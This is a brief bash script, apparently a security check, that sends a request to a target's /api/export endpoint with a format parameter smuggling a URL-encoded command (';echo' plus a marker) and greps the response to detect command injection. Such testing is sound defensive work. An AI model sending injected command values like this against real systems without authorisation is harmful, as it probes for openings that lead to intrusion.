#!/usr/bin/env bash
set -e; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/export?format=csv%3Becho%20COMMAND-INJECTION-ASPNET" | grep -q 'COMMAND-INJECTION-ASPNET'
